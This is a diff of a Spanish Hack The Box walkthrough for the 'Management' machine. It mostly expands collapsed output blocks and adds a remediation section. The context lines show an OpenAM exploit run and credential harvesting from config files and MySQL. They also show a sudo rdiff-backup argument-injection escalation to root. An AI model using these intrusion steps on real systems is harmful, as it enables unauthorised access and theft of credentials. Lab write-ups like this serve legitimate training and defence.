@@ -48,7 +48,7 @@ nmap -p- --min-rate=1000 -T4 -Pn <TARGET_IP> -oN escaneo.txt
 
 **5. Usaremos el reporte completo de Nmap con ```-sVC``` para ver bien a que nos enfrentamos:**
 
-<details>
+<details open>
 <summary>Ver output completo de Nmap</summary>
 
 ```text
@@ -131,7 +131,7 @@ ldapsearch -x -H ldap://<TARGET_IP>:50389 -b "" -s base "(objectclass=*)" "*" +
 
 **9. Leemos detenidamente el output anterior:**
 
-<details>
+<details open>
 <summary>Ver output completo de ldapsearch</summary>
 
 ```ldif
@@ -233,7 +233,7 @@ ldapsearch -x -H ldap://<TARGET_IP>:50389 -b "dc=management,dc=htb" "(objectclas
 
 **11. Analizaremos output y sacaremos las conclusiones correctas:**
 
-<details>
+<details open>
 <summary>Ver output completo de ldapsearch</summary>
 
 ```ldif
@@ -273,7 +273,7 @@ También interesa saber a dónde redirige exactamente el botón ```Client login`
 
 Para esto nos meteremos desde el navegador que sea y ejecutamos el atajo ```Ctrl + U``` para ver el código fuente de la página:
 
-<details>
+<details open>
 <summary>Ver output completo del html</summary>
 
 ```html
@@ -343,7 +343,7 @@ python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidat
 
 **14. Analizamos el resultado de la ejecución anterior:**
 
-<details>
+<details open>
 <summary>Ver output completo</summary>
 
 ```bash
@@ -373,7 +373,7 @@ python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidat
 
 **16. Ahora vemos el resultado y estabilizamos la shell**. Una vez ejecutado vamos a la terminal que tenga el listener y verificamos que efectivamente estamos dentro:
 
-<details>
+<details open>
 <summary>Ver output completo</summary>
 
 ```bash
@@ -387,7 +387,7 @@ openam@management:/$ █
 
 Pongamos el comando ```id``` por ejemplo y si todo salió bien nos deberá de arrojar exactamente la información de antes:
 
-<details>
+<details open>
 <summary>Ver output completo</summary>
 
 ```bash
@@ -418,7 +418,7 @@ cat /opt/openam/config/openam/.keypass
 ambas muestran los siguientes dos resultados:
 
 
-<details>
+<details open>
 <summary>Ver output completo</summary>
 
 ```bash
@@ -426,7 +426,7 @@ S9n50IUgcRe1Lkj/7gp5OpdZHf1bphqh
 ```
 </details>
 
-<details>
+<details open>
 <summary>Ver output completo</summary>
 
 ```bash
@@ -443,7 +443,7 @@ En realidad, las credenciales se encontraban en ```GLPI```.
 cat /opt/glpi/config/config_db.php
 ```
 
-<details>
+<details open>
 <summary>Ver output completo</summary>
 
 ```php
@@ -468,7 +468,7 @@ Como vemos acabamos de encontrar credenciales de una **Bases de Datos.**
 mysql -u glpi -p'8rhu0L6Pw4Y7' -h 127.0.0.1 glpidb -e "SELECT * FROM glpi_authldaps\G"
 ```
 
-<details>
+<details open>
 <summary>Ver output completo sql</summary>
 
 ```sql
@@ -561,7 +561,7 @@ echo \$plain . PHP_EOL;
 
 y nos devuelve esta cadena de caracteres:
 
-<details>
+<details open>
 <summary>Ver output</summary>
 
 ```text
@@ -578,7 +578,7 @@ ssh owen@management.htb
 enter password: █
 ```
 
-<details>
+<details open>
 <summary>Ver output completo</summary>
 
 ```bash
@@ -630,7 +630,7 @@ owen@management:~$ cat user.txt
 sudo -l
 ```
 
-<details>
+<details open>
 <summary>Ver output completo</summary>
 
 ```bash
@@ -681,7 +681,7 @@ rdiff-backup \
   backup /::/root /tmp/root_backup
 ```
 
-<details>
+<details open>
 <summary>Ver output completo</summary>
 
 ```bash
@@ -708,7 +708,7 @@ Dado que el segundo parámetro ```--restrict-path /``` prevalece, la restricció
 ls -la /tmp/root_backup
 cat /tmp/root_backup/root.txt
 ```
-<details>
+<details open>
 <summary>Ver output completo</summary>
 
 ```bash
@@ -732,5 +732,16 @@ owen@management:~$ cat /tmp/root_backup/root.txt
 </details>
 ­­
 
-Felicidades conseguiste hackear la maquina,
-Happy Hacking!
+# Fase de Remediación y Mitigación
+Esta fase es totalmente adicional pero para mi es necesario aclarar esto.
+Para cerrar los vectores de ataque identificados durante la evaluación, se recomiendan las siguientes medidas técnicas:
+
+- **Actualización de OpenAM (`CVE-2026-33439`):**
+   - **Problema:** El *framework JATO* deserializa el parámetro `jato.clientSession` sin validar los tipos de objetos entrantes, permitiendo la ejecución remota de código antes de la autenticación.
+   - **Solución propuesta:** Actualizar OpenAM Community Edition a una versión parcheada posterior a la `16.0.5` que incluya listas blancas (*whitelisting*) estrictas sobre las clases permitidas durante la deserialización. Como medida temporal, restringir el acceso externo a las rutas administrativas y de restablecimiento (`/openam/ui/PWResetUserValidation`) mediante reglas en el *proxy* inverso (*Nginx*).
+- **Aislamiento de permisos en archivos de configuración (GLPI):**
+   - **Problema:** El usuario de servicio `openam` tiene permisos de lectura sobre `/opt/glpi/config/config_db.php` y `/opt/glpi/config/glpicrypt.key`, lo que permite extraer las credenciales de la base de datos y descifrar los secretos almacenados en `glpi_authldaps`.
+   - **Solución:** Aplicar el principio de menor privilegio asignando propietarios dedicados a cada aplicación (`chown -R www-data:www-data /opt/glpi/config`) y restringiendo los permisos de lectura (`chmod 640`) para que cuentas de otros servicios no puedan acceder a archivos sensibles entre aplicaciones.
+- **Endurecimiento de la configuración de `sudoers`:**
+   - **Problema:** La regla `(root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *` utiliza un comodín (`*`) al final, permitiendo inyectar un segundo parámetro `--restrict-path /` que anula la restricción original.
+   - **Solución:** Eliminar el comodín de `/etc/sudoers` y definir el comando con argumentos exactos, o bien encapsular la tarea de respaldo dentro de un script propiedad de `root` (sin permisos de escritura para otros usuarios) que valide las rutas antes de ejecutar `rdiff-backup`.
